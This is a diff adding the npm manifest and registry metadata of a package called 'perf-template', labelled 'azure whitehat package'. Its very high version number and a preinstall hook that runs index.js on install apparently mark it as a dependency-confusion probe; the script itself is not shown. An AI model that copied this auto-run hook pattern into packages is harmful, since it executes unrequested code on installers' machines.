@@ -1,0 +1,39 @@
+{
+    "name": "perf-template",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "perf-template@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-vHm13K3LJUCTEBqXT6TmoolrXpIIfUV1l8q5Vb0LOrZ+C9r/mL6po9SqOCZ8719GmHpWQhbE2mPhpjNO+Ivm6Q==",
+        "shasum": "e5dccff9a7d0d660783e51a13aff1d1b6ce43719",
+        "tarball": "https://registry.npmjs.org/perf-template/-/perf-template-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3577,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhon4iCRA9TVsSAnZWagAAa+sP/3JqHC0tMESFNPGsH8Qc\nAjdiB438aJwBohEVQJLSEP5GigOJqLINpJCRE0ZNDgmHIBbXQwKMl7p/BQDR\nvkO1DMbFsepRSEtwLNeKjiPaqn3ztKeJONjrzAcMkYIbAa3e8vM2AwG4upns\nDtrmrr8FaFhrwjy3Q9VpKC9I7s7NWXwco7sYGtqQTGwzp986w6Pt5/967i7o\niaNAFxriLrTlWSRPG+KrJpUXsXyVT/p8cBQ4Uc8yf5uzU5bjL5SCAuDjRE+t\n/+X6fY+3CK1RGOlYSUzlZr6AcnQP3CnliOdYH51MGtu7iJB3/HjEfR7Swp50\nYtF2cgYeJV1RzTubzKXhh5zJ5CdEoJ/f6m0NA0lruvSSY4o7nu9w9wsoI77W\nRBQq6nuJSVHtWeRLR2Qs3iyxETVYaSbxYvZ/Cbm6xcxqjdM0VBRBPj3T07X3\nZm4P9sVZ60mftNwv0mP4YdjJ+MDTUUBspRQ+zDTzkDdZwhmBY6DYbs25pl+U\nyS3K9sJLaiGmnnWRZlB5E1NldZnMSPbCUTI2vpkYyVnhV3jRQpn9ZzIZWdI+\ntskbV5+OwfktV9kIZY6rztO4cRS6kgZmw5GujRMW8s8B8gIt+L7XBPlkAuTD\nZYcx+yXwwIkYJNLmsmbi132Krqmp6FDSVy55rJRe9yrq8rwNEGtprGRTa0vr\nvOCA\r\n=NtnT\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/perf-template_99.10.9_1638039074405_0.4529663423072492"
+    },
+    "_hasShrinkwrap": false
+}
